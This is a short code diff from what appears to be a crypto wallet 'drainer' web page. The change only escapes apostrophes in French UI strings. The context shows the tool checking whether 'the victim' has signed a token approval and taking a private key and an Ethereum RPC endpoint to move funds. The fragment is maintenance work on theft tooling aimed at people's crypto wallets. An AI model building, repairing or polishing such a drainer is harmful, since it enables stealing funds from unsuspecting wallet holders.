@@ -140,7 +140,7 @@ export default function DrainPage() {
         return;
       }
       if (allowance === 0n) {
-        setError("Aucune approbation — la victime n'a pas signé");
+        setError("Aucune approbation — la victime n&apos;a pas signé");
         setLoading(false);
         return;
       }
@@ -263,7 +263,7 @@ export default function DrainPage() {
             </button>
           </div>
           <div style={{ color: "#94a3b8", fontSize: "0.75rem", marginBottom: "1rem" }}>
-            ⚠️ La clé reste dans votre navigateur. Elle n'est jamais envoyée à un serveur.
+            ⚠️ La clé reste dans votre navigateur. Elle n&apos;est jamais envoyée à un serveur.
           </div>
 
           <label className="form-label">RPC Ethereum</label>
